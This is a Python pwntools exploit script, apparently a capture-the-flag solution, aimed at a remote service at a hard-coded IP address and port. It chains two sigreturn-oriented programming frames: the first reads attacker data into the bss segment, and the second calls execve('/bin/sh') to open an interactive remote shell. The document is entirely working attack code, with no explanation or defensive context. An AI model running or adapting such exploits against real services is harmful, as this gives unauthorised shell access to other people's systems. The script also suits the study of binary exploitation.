from pwn import *
from time import sleep

context.log_level = 'error'
context.arch = 'amd64'

host='123.57.66.184'
port=10025

bss = 0x600108
readRet = 0x4000EE
sysCall = 0x400100

p = remote(host, port, timeout=4)
p.recvuntil(b'hacker, TNT!\n', timeout=1)

# Stage 1: SROP -> read(0, bss, 0x400)
frame = SigreturnFrame()
frame.rip = sysCall
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rsp = bss
frame.rbp = bss
payload1 = p64(0xdeadbeef)*2 + p64(readRet) + p64(sysCall) + bytes(frame)
p.sendafter(b'hacker, TNT!\n', payload1)
sleep(0.1)
p.send(b'A'*15)

# Stage 2: SROP -> execve('/bin/sh', 0, 0)
sysFrame = SigreturnFrame()
sysFrame.rip = sysCall
sysFrame.rax = 59
sysFrame.rdi = bss
sysFrame.rsi = 0
sysFrame.rdx = 0
payload2 = b'/bin/sh\x00' + p64(0xdeadbeef) + p64(readRet) + p64(sysCall) + bytes(sysFrame)
sleep(0.1)
p.send(payload2)
sleep(0.1)
p.send(b'A'*15)

p.interactive()
